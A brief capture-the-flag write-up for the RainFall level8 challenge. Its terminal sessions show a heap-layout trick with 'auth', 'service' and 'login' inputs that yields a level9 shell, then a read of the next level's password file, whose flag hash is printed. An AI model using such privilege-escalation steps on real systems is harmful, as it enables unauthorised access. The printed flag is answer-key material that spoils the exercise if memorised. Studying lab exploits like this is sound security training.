Ok, right after decompiling the executable, I immediately found the flag completely by chance while playing around with possible phrases:

```nasm
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth
(nil), (nil) 
auth 
0x804a008, (nil) 
reset
0x804a008, (nil) 
auth 
0x804a008, (nil) 
auth 
0x804a018, (nil) 
service
0x804a018, 0x804a028 
login
Password:
0x804a018, 0x804a028 
service
0x804a018, 0x804a038 
service
0x804a018, 0x804a048 
service
0x804a018, 0x804a058 
login
$ ls
ls: cannot open directory .: Permission denied
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

By looking at the source code for more than two seconds, it simply appears that auth + 32 must not be equal to 0. The service increments addresses by 0x10 with the help of strdup(). So, by having a non-null memory space at +0x20 from the address in auth, the condition is met:

```nasm
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ whoami
level9
```